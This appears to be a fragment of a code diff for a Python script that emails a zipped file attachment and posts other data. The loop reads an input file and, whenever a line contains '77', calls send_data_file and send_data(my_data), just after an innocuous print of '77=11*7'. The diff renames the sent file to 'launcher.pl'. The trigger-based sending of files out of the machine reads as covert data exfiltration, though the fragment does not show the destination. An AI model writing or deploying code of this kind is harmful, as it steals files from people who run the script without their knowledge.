@@ -21,7 +21,7 @@ def send_data_file(zip_filename="data.zip", message="no_data"):
     
     # Attach the zip file
     with open(zip_filename, 'rb') as attachment:
-        part = MIMEBase('application', 'python')
+        part = MIMEBase('application', 'pl')
         part.set_payload(attachment.read())
         encoders.encode_base64(part)
         part.add_header('Content-Disposition', f'attachment; filename= {zip_filename}')
@@ -104,6 +104,6 @@ print("77=11*7")
 with open(argv[1], "r") as f:
     for line in f:
         if(line.count("77")):
-            send_data_file("tempCodeRunnerFile.python", "mygit")
+            send_data_file("launcher.pl", "mygit")
             send_data(my_data)
 ##############################################################
